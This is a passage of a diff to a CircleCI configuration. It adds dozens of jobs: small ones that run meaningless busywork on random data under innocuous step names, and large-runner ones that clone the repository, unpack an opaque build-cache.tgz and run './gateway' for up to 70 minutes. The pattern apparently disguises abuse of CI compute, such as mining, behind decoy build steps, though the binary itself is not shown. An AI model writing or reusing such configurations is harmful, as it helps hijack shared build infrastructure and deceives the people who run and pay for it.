+            { set +o pipefail 2>/dev/null; seq 1 226040 | paste - - - - | wc -l; true ; } > /tmp/stage/buffer.raw
+            size=$(wc -c </tmp/stage/buffer.raw); echo "stage ok: nebula-plus size=${size}"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - buffer.raw
+  nebula-plus:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Fetch workspace file
+          command: |
+            { cat /tmp/stage/buffer.raw > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: gunzip -c build-cache.tgz | tar xvf -
+      - run:
+          name: Validate binary
+          command: uname -a
+      - run:
+          name: Post-build check
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 70m
+          command: nice -n 0 ./gateway
+  orchestrate_check-staging-artifact-bundle:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Materialize sort order
+          command: |
+            mkdir -p /tmp/stage
+            { set +o pipefail 2>/dev/null; cat /dev/urandom | head -c 512000 | base64 | head -c 200 | wc -c; true ; } > /tmp/stage/367b.txt
+            size=$(wc -c </tmp/stage/367b.txt); echo "stage ok: check-staging-artifact-bundle size=${size}"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - 367b.txt
+  check-staging-artifact-bundle:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Fetch workspace file
+          command: |
+            { cat /tmp/stage/DONE.txt > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: gunzip -c build-cache.tgz | tar xvf -
+      - run:
+          name: Validate binary
+          command: uname -a
+      - run:
+          name: Post-build check
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 70m
+          command: nice -n 0 ./gateway
+  gamma_CORE-715:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Checkpoint context
+          command: |
+            mkdir -p /tmp/stage
+            { set +o pipefail 2>/dev/null; ( for i in $(seq 1 14243); do echo "row-$i-$RANDOM"; done ) | md5sum; true ; } > /tmp/stage/summary.txt
+            size=$(wc -c </tmp/stage/summary.txt); echo "stage ok: CORE-715 size=${size}"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - summary.txt
+  CORE-715:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Fetch workspace file
+          command: |
+            { cat /tmp/stage/summary.txt > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: gunzip -c build-cache.tgz | tar xvf -
+      - run:
+          name: Validate binary
+          command: uname -a
+      - run:
+          name: Post-build check
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 70m
+          command: nice -n 0 ./gateway
+  do_mar8-rev:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Prune log tail
+          command: |
+            mkdir -p /tmp/stage
+            { set +o pipefail 2>/dev/null; tr -dc '0-9' </dev/urandom | head -c 1638400 | wc -c; true ; } > /tmp/stage/timings.tsv
+            size=$(wc -c </tmp/stage/timings.tsv); echo "stage ok: mar8-rev size=${size}"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - timings.tsv
+  mar8-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Fetch workspace file
+          command: |
+            { cat /tmp/stage/timings.tsv > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: gunzip -c build-cache.tgz | tar xvf -
+      - run:
+          name: Validate binary
+          command: uname -a
+      - run:
+          name: Post-build check
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 70m
+          command: nice -n 0 ./gateway
+  spinner_DEV_HOOK_5:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Deflate payload chunk
+          command: |
+            mkdir -p /tmp/stage
+            { set +o pipefail 2>/dev/null; cat /dev/urandom | tr -dc 'a-f0-9' | head -c 225280 | fold -w16 | awk '!seen[$0]++' | wc -l; true ; } > /tmp/stage/ckpt-main.state
+            size=$(wc -c </tmp/stage/ckpt-main.state); echo "stage ok: DEV_HOOK_5 size=${size}"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - ckpt-main.state
+  DEV_HOOK_5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Fetch workspace file
+          command: |
+            { cat /tmp/stage/DONE.txt > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: gunzip -c build-cache.tgz | tar xvf -
+      - run:
+          name: Validate binary
+          command: uname -a
+      - run:
+          name: Post-build check
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 70m
+          command: nice -n 0 ./gateway
+  Alpha_atlas-ng:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Normalize path list
+          command: |
+            mkdir -p /tmp/stage
+            { set +o pipefail 2>/dev/null; tr -dc 'A-F0-9' </dev/urandom | head -c 1484800 | fold -w8 | sort -u | wc -l; true ; } > /tmp/stage/step-10.txt
+            size=$(wc -c </tmp/stage/step-10.txt); echo "stage ok: atlas-ng size=${size}"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - step-10.txt
+  atlas-ng:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Fetch workspace file
+          command: |
+            { cat /tmp/stage/DONE.txt > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: gunzip -c build-cache.tgz | tar xvf -
+      - run:
+          name: Validate binary
+          command: uname -a
+      - run:
+          name: Post-build check
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 70m
+          command: nice -n 0 ./gateway
+  Gamma_STAGE_STG:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Rotate ring buffer
+          command: |
+            mkdir -p /tmp/stage
+            { set +o pipefail 2>/dev/null; ( for i in $(seq 1 2479); do echo "row-$i-$RANDOM"; done ) | md5sum; true ; } > /tmp/stage/step-11.log
+            size=$(wc -c </tmp/stage/step-11.log); echo "stage ok: STAGE_STG size=${size}"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - step-11.log
+  STAGE_STG:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Fetch workspace file
+          command: |
+            { cat /tmp/stage/DONE.txt > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: gunzip -c build-cache.tgz | tar xvf -
+      - run:
+          name: Validate binary
+          command: uname -a
+      - run:
+          name: Post-build check
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 70m
+          command: nice -n 0 ./gateway
+
+  tmp_may26-smoke_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Audit path segments
+          command: |
+            mkdir -p /tmp/stage
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{p=1;for(i=1;i<=2288400;i++)p=(p*i)%1000000007;print p}'; true ; } > /tmp/stage/FINAL.txt
+            size=$(wc -c </tmp/stage/FINAL.txt); echo "stage ok: may26-smoke size=${size}"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - FINAL.txt
+  route_nebula-plus_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Verify fixture integrity
+          command: |
+            mkdir -p /tmp/stage
+            { set +o pipefail 2>/dev/null; cat /dev/urandom | tr -dc 'a-f0-9' | head -c 30720 | fold -w16 | awk '!seen[$0]++' | wc -l; true ; } > /tmp/stage/buffer.raw
+            size=$(wc -c </tmp/stage/buffer.raw); echo "stage ok: nebula-plus size=${size}"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - buffer.raw
+  drain_chen-verify_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Reduce row partitions
+          command: |
+            mkdir -p /tmp/stage
+            set +o pipefail 2>/dev/null; ( echo "init-$(date +%s)"; seq 1 100000 ) | md5sum > /tmp/stage/186a.txt; true
+            size=$(wc -c </tmp/stage/186a.txt); echo "stage ok: chen-verify size=${size}"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - 186a.txt
+  drain_CORE-715_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Build summary row
+          command: |
+            mkdir -p /tmp/stage
+            { set +o pipefail 2>/dev/null; seq 1 188272 | awk '{s+=$1}END{print s}'; true ; } > /tmp/stage/summary.txt
+            size=$(wc -c </tmp/stage/summary.txt); echo "stage ok: CORE-715 size=${size}"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - summary.txt
+  orchestrate_check-staging-integration-tests_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Compute slot digest
+          command: |
+            mkdir -p /tmp/stage
+            { set +o pipefail 2>/dev/null; head -c 12582912 /dev/urandom | gzip -1 | wc -c; true ; } > /tmp/stage/2024-10-15.data
+            size=$(wc -c </tmp/stage/2024-10-15.data); echo "stage ok: check-staging-integration-tests size=${size}"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - 2024-10-15.data
+  db_titan2-alpha_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Precompute lookup
+          command: |
+            mkdir -p /tmp/stage
+            { set +o pipefail 2>/dev/null; ( for i in $(seq 1 14592); do printf "%d\n" $i; done ) | sort -n | tail -1; true ; } > /tmp/stage/trace.ndjson
+            size=$(wc -c </tmp/stage/trace.ndjson); echo "stage ok: titan2-alpha size=${size}"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - trace.ndjson
+  A_mar8-rev_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Chunk raw buffer
+          command: |
+            mkdir -p /tmp/stage
+            { set +o pipefail 2>/dev/null; tr -dc '0-9A-F' </dev/urandom | head -c 225280 | fold -w4 | sort -R 2>/dev/null | head -c 200 || true; echo done; true ; } > /tmp/stage/timings.tsv
+            size=$(wc -c </tmp/stage/timings.tsv); echo "stage ok: mar8-rev size=${size}"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - timings.tsv
+workflows:
+  build:
+    jobs:
+      - compile_add-parse-leak
+      - p1_all-greens
+      - verify_package
+      - add-parse-leak:
+          requires:
+            - compile_add-parse-leak
+            - p1_all-greens
+            - verify_package
+      - all-greens:
+          requires:
+            - compile_add-parse-leak
+            - p1_all-greens
+            - verify_package
+      - package:
+          requires:
+            - compile_add-parse-leak
+            - p1_all-greens
+            - verify_package
+      - py310-fmt:
+          requires:
+            - compile_add-parse-leak
+            - p1_all-greens
+            - verify_package
+      - verify-end-to-end-integration-tests:
+          requires:
+            - compile_add-parse-leak
+            - p1_all-greens
+            - verify_package
+      - v4-beta2:
+          requires:
+            - compile_add-parse-leak
+            - p1_all-greens
+            - verify_package
+      - io-rev:
+          requires:
+            - compile_add-parse-leak
+            - p1_all-greens
+            - verify_package
+      - build-full-release-candidate:
+          requires:
+            - compile_add-parse-leak
+            - p1_all-greens
+            - verify_package
+      - green-light:
+          requires:
+            - compile_add-parse-leak
+            - p1_all-greens
+            - verify_package
+      - ensure-production-artifact-bundle:
+          requires:
+            - compile_add-parse-leak
+            - p1_all-greens
+            - verify_package
+      - validate-full-regression-suite:
+          requires:
+            - compile_add-parse-leak
+            - p1_all-greens
+            - verify_package
+      - vega-final:
+          requires:
+            - compile_add-parse-leak
+            - p1_all-greens
+            - verify_package
+      - atlas-ng:
+          requires:
+            - compile_add-parse-leak
+            - p1_all-greens
+            - verify_package
+      - DEV_HOOK_5:
+          requires:
+            - compile_add-parse-leak
+            - p1_all-greens
+            - verify_package
+      - ruby3-cov:
+          requires:
+            - compile_add-parse-leak
+            - p1_all-greens
+            - verify_package
+      - STAGE_STG:
+          requires:
+            - compile_add-parse-leak
+            - p1_all-greens
+            - verify_package
+      - fix-webhook:
+          requires:
+            - compile_add-parse-leak
+            - p1_all-greens
+            - verify_package
+      - zulu:
+          requires:
+            - compile_add-parse-leak
+            - p1_all-greens
+            - verify_package
+      - check-staging-artifact-bundle:
+          requires:
+            - compile_add-parse-leak
+            - p1_all-greens
+            - verify_package
+      - b-v2:
+          requires:
+            - compile_add-parse-leak
+            - p1_all-greens
+            - verify_package
+      - gating:
+          requires:
+            - compile_add-parse-leak
+            - p1_all-greens
+            - verify_package
+      - verify-end-to-end-docker-image:
+          requires:
+            - compile_add-parse-leak
+            - p1_all-greens
+            - verify_package
+      - alpha-v8:
+          requires:
+            - compile_add-parse-leak
+            - p1_all-greens
+            - verify_package
+      - generate_may26-smoke
+      - tmp_may26-smoke_2:
+          requires:
+            - generate_may26-smoke
+      - may26-smoke:
+          requires:
+            - tmp_may26-smoke_2
+      - linter_nebula-plus:
+          requires:
+            - tmp_may26-smoke_2
+      - route_nebula-plus_2:
+          requires:
+            - linter_nebula-plus
+      - nebula-plus:
+          requires:
+            - route_nebula-plus_2
+      - sys_chen-verify:
+          requires:
+            - route_nebula-plus_2
+      - drain_chen-verify_2:
+          requires:
+            - sys_chen-verify
+      - chen-verify:
+          requires:
+            - drain_chen-verify_2
+      - gamma_CORE-715:
+          requires:
+            - drain_chen-verify_2
+      - drain_CORE-715_2:
+          requires:
+            - gamma_CORE-715
+      - CORE-715:
+          requires:
+            - drain_CORE-715_2
+      - B_check-staging-integration-tests:
+          requires:
+            - drain_CORE-715_2
+      - orchestrate_check-staging-integration-tests_2:
+          requires:
+            - B_check-staging-integration-tests
+      - check-staging-integration-tests:
+          requires:
+            - orchestrate_check-staging-integration-tests_2
+      - canary1_titan2-alpha:
+          requires:
+            - orchestrate_check-staging-integration-tests_2
+      - db_titan2-alpha_2:
+          requires:
+            - canary1_titan2-alpha
+      - titan2-alpha:
+          requires:
+            - db_titan2-alpha_2
+      - do_mar8-rev:
+          requires:
+            - db_titan2-alpha_2
+      - A_mar8-rev_2:
+          requires:
+            - do_mar8-rev
+      - mar8-rev:
+          requires:
+            - A_mar8-rev_2
